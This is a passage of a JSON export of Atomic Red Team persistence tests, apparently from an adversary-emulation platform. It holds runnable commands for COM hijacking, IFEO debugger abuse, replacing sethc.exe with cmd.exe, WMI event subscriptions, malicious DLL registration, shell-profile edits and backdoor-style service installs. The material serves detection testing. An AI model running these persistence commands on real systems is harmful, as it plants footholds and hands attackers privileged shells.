\"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ", "successCriteria": null}], "techniqueIds": ["clacwm6kn03kn29mqejzz1qby"], "tags": []}, {"data": {"name": "COM Hijacking - InprocServer32", "shortName": "T1546.015", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | clsid_threading | Threading Model | string | Apartment | \n | dllpath | Path to the DLL. | String | $env:TEMP\\AtomicTest.dll | \n | clsid | Class ID to hijack. | string | {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} | \n | clsid_description | Description for CLSID | string | MSAA AccPropServices | "}, "executionSteps": [{"description": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value #{dllpath}\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'", "successCriteria": null}], "techniqueIds": ["clacwm6kn03kn29mqejzz1qby"], "tags": []}, {"data": {"name": "Persistance with Event Monitor - emond", "shortName": "T1546.014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | plist | Path to attacker emond plist file | Path | PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist | "}, "executionSteps": [{"description": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n", "successCriteria": null}], "techniqueIds": ["clacwm6fq03f829mqb3u7f1eu", "clacwm1s700cf29mq3hyncaus"], "tags": []}, {"data": {"name": "Append malicious start-process cmdlet", "shortName": "T1546.013", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_path | Path the malicious executable | Path | calc.exe | \n | ps_profile | Powershell profile to use | String | $profile | "}, "executionSteps": [{"description": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n", "successCriteria": null}], "techniqueIds": ["clacwm5r802pq29mq0a0mbbac", "clacwm29i00op29mq2zge12mq"], "tags": []}, {"data": {"name": "IFEO Global Flags", "shortName": "T1546.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Leverage Global Flags Settings\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_binary | Binary To Attach To | Path | notepad.exe | \n | payload_binary | Binary To Execute | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm68y037p29mq0ieo3dtb", "clacwm1y300gf29mqfacncsje"], "tags": []}, {"data": {"name": "IFEO Add Debugger", "shortName": "T1546.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Leverage Global Flags Settings\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_binary | Binary To Attach To | Path | calc.exe | \n | payload_binary | Binary To Execute | Path | C:\\Windows\\System32\\cmd.exe | "}, "executionSteps": [{"description": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm68y037p29mq0ieo3dtb", "clacwm1y300gf29mqfacncsje"], "tags": []}, {"data": {"name": "GlobalFlags in Image File Execution Options", "shortName": "T1546.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process | Process to monitor\n | String | whoami.exe | \n | cmd_to_run | Command to execute\n | String | cmd.exe /c calc.exe | "}, "executionSteps": [{"description": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm68y037p29mq0ieo3dtb"], "tags": []}, {"data": {"name": "Registry key creation and/or modification events for SDB", "shortName": "T1546.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61a030129mq8rnwfo9d", "clacwm1cf002829mqatkiawd1"], "tags": []}, {"data": {"name": "New shim database files created in the default shim database directory", "shortName": "T1546.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n", "successCriteria": null}], "techniqueIds": ["clacwm61a030129mq8rnwfo9d", "clacwm1cf002829mqatkiawd1"], "tags": []}, {"data": {"name": "Application Shim Installation", "shortName": "T1546.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | Path to the shim database file | String | PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb | "}, "executionSteps": [{"description": "sdbinst.exe #{file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm61a030129mq8rnwfo9d", "clacwm1cf002829mqatkiawd1"], "tags": []}, {"data": {"name": "Install AppInit Shim", "shortName": "T1546.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | registry_file | Windows Registry File | Path | PathToAtomicsFolder\\T1546.010\\src\\T1546.010.reg | \n | registry_cleanup_file | Windows Registry File | Path | PathToAtomicsFolder\\T1546.010\\src\\T1546.010-cleanup.reg | "}, "executionSteps": [{"description": "reg.exe import #{registry_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6nh03o329mqfzp73cua", "clacwm1bv001w29mq8upfb5mx"], "tags": []}, {"data": {"name": "Create registry persistence via AppCert DLL", "shortName": "T1546.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item $PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nRestart-Computer\n", "successCriteria": null}], "techniqueIds": ["clacwm6bi03ai29mq230w6kte"], "tags": []}, {"data": {"name": "Replace binary of sticky keys", "shortName": "T1546.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm69m038i29mq2rk479ai", "clacwm1as001729mqf6tzfagn"], "tags": []}, {"data": {"name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "shortName": "T1546.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | parent_list | Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n | String | osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe | \n | attached_process | Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n | Path | C:\\windows\\system32\\cmd.exe | "}, "executionSteps": [{"description": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm69m038i29mq2rk479ai", "clacwm1as001729mqf6tzfagn"], "tags": []}, {"data": {"name": "Netsh Helper DLL Registration", "shortName": "T1546.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | helper_file | Path to DLL | Path | PathToAtomicsFolder\\T1546.007\\bin\\NetshHelper.dll | "}, "executionSteps": [{"description": "netsh.exe add helper #{helper_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6u703vb29mqdfep66cv", "clacwm24y00l129mq29wverz4"], "tags": []}, {"data": {"name": "Trap", "shortName": "T1546.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After exiting the shell, the script will download and execute.\nAfter sending a keyboard interrupt (CTRL+C) the script will download and execute.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh | bash\" SIGINt\n", "successCriteria": null}], "techniqueIds": ["clacwm66q035d29mq0v2neohf", "clacwm2jy00xx29mq7dvsd6f2"], "tags": []}, {"data": {"name": "Add command to .bashrc", "shortName": "T1546.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adds a command to the .bashrc file of the current user\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_add | Command to add to the .bashrc file | String | echo \"Hello from Atomic Red Team T1546.004\" | "}, "executionSteps": [{"description": "echo '#{command_to_add}' >> ~/.bashrc\n", "successCriteria": null}], "techniqueIds": ["clacwm6j503je29mqfcgperd2", "clacwm2k900y829mq0lnb75si"], "tags": []}, {"data": {"name": "Add command to .bash_profile", "shortName": "T1546.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adds a command to the .bash_profile file of the current user\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_add | Command to add to the .bash_profile file | String | echo \"Hello from Atomic Red Team T1546.004\" | "}, "executionSteps": [{"description": "echo '#{command_to_add}' >> ~/.bash_profile\n", "successCriteria": null}], "techniqueIds": ["clacwm6j503je29mqfcgperd2", "clacwm2k900y829mq0lnb75si"], "tags": []}, {"data": {"name": "Windows MOFComp.exe Load MOF File", "shortName": "T1546.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mofcomp_path | Location of mofcomp.exe | String | c:\\windows\\system32\\wbem\\mofcomp.exe | \n | mof_file | Local location MOF file | String | PathToAtomicsFolder\\T1546.003\\src\\T1546.003.mof | "}, "executionSteps": [{"description": "#{mofcomp_path} #{mof_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ej03du29mqcr6y5lqa"], "tags": []}, {"data": {"name": "Persistence via WMI Event Subscription - CommandLineEventConsumer", "shortName": "T1546.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "successCriteria": null}], "techniqueIds": ["clacwm6ej03du29mqcr6y5lqa"], "tags": []}, {"data": {"name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer", "shortName": "T1546.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n", "successCriteria": null}], "techniqueIds": ["clacwm6ej03du29mqcr6y5lqa"], "tags": []}, {"data": {"name": "Persistence via WMI Event Subscription", "shortName": "T1546.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "successCriteria": null}], "techniqueIds": ["clacwm2mh010e29mq1z0yafbr"], "tags": []}, {"data": {"name": "Set Arbitrary Binary as Screensaver", "shortName": "T1546.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_binary | Executable binary to use in place of screensaver for persistence | Path | C:\\Windows\\System32\\cmd.exe | \n | reboot | Set to non-zero value if you want the test to reboot the system so that changes take effect | Integer | 0 | "}, "executionSteps": [{"description": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n", "successCriteria": null}], "techniqueIds": ["clacwm6nt03oe29mq1ap9b7cr", "clacwm2dz00sk29mq67cb7hur"], "tags": []}, {"data": {"name": "Change Default File Association", "shortName": "T1546.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_extension_handler | txtfile maps to notepad.exe | Path | txtfile | \n | extension_to_change | File Extension To Hijack | String | .hta | \n | original_extension_handler | File Extension To Revert | String | htafile | "}, "executionSteps": [{"description": "assoc #{extension_to_change}=#{target_extension_handler}\n", "successCriteria": null}], "techniqueIds": ["clacwm6fd03eq29mqads98s5z", "clacwm1g5004i29mq9joickay"], "tags": []}, {"data": {"name": "Launch Daemon", "shortName": "T1543.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize LaunchDaemon to launch `Hello World`\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | plist_filename | filename | String | com.atomicredteam.plist | \n | path_malicious_plist | Name of file to store in cron folder | String | $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist | "}, "executionSteps": [{"description": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm65b033t29mq1iy2ec35", "clacwm21g00ij29mqaiufer7a"], "tags": []}, {"data": {"name": "TinyTurla backdoor service w64time", "shortName": "T1543.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dllfilename | It specifies Dll file to run as service | string | $PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll | "}, "executionSteps": [{"description": "copy #{dllfilename} %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time", "successCriteria": null}], "techniqueIds": ["clacwm5vm02uu29mqbhajgzuc"], "tags": []}, {"data": {"name": "Service Installation PowerShell", "shortName": "T1543.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | binary_path | Name of the service binary, include path. | Path | PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe | \n | service_name | Name of the Service | String | AtomicTestService_PowerShell | "}, "executionSteps": [{"description": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5vm02uu29mqbhajgzuc", "clacwm2mk010j29mqh6n6htcl"], "tags": []}, {"data": {"name": "Service Installation CMD", 